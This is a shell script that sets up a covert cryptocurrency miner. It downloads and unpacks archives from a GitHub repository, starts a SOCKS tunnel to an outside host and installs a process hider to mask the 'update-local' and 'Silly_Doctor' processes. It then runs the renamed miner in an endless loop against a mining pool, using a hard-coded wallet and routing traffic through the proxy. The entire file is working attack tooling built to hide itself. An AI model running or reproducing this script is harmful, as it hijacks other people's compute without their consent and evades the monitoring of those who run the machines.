#!/bin/sh
cd
sleep 2

sudo -i

sleep 2

apt update >/dev/null;apt -y install apt-utils psmisc libreadline-dev dialog automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null

sleep 2

export DEBIAN_FRONTEND=noninteractive
DEBIAN_FRONTEND=noninteractive

sleep 2

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/cheese.tar.gz > /dev/null

sleep 2

tar -xf cheese.tar.gz

sleep 2

./cheese client -v cpusocks$(shuf -i 2-6 -n 1).wot.mrface.com:80 7777:socks &

sleep 2

wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

sleep 2

source ~/.bashrc

sleep 2

nvm install 21.6.1

sleep 2

npm

sleep 2

npm install -g npm@10.4.0

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

num_of_cores=`cat /proc/cpuinfo | grep processor | wc -l`
currentdate=$(date '+%d-%b-%Y_Buddy_')
ipaddress=$(curl -s api.ipify.org)
underscored_ip=$(echo $ipaddress | sed 's/\./_/g')
currentdate+=$underscored_ip
used_num_of_cores=`expr $num_of_cores - 1`
echo ""
echo "You will be using $used_num_of_cores cores"
echo ""

sleep 2

npm i -g node-process-hider 1>/dev/null 2>&1

sleep 2

ph add update-local 1>/dev/null 2>&1

sleep 2

ph add Silly_Doctor 1>/dev/null 2>&1

sleep 2

curl -s -L -o update.tar.gz https://raw.githubusercontent.com/alexgabbard01/update/main/update.tar.gz > /dev/null

sleep 2

tar -xf update.tar.gz > /dev/null

sleep 2

cat > update/local/update-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 127.0.0.1:7777
END

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

ps -A | grep update-local | awk '{print $1}' | xargs kill -9 $1

sleep 3

./update/local/update-local -config update/local/update-local.conf & > /dev/null

sleep 2

./update/update curl ifconfig.me

sleep 2

./update/update wget -q https://raw.githubusercontent.com/alexgabbard01/update/main/Silly_Doctor_246.tar.gz 1>/dev/null 2>&1

sleep 2

tar -xf Silly_Doctor_246.tar.gz

echo " "
echo " "

sleep 2

echo "Your worker name will be : $currentdate"

sleep 2

echo ""
echo ""
sleep 2

unset LD_PRELOAD
unset LD_PRELOAD_ENV
unset LD_LIBRARY_PATH

sleep 2

while true
do
./Silly_Doctor --disable-gpu --algorithm aurum --pool stratum-na.rplant.xyz:7109 --wallet BE68QAyJA16B2QgtFPKjXZyuQTJJmLEm48.$currentdate --password webpassword=IhatePopUps --proxy 127.0.0.1:7777 --cpu-threads $used_num_of_cores --keepalive 1>/dev/null 2>&1
sleep 10
done
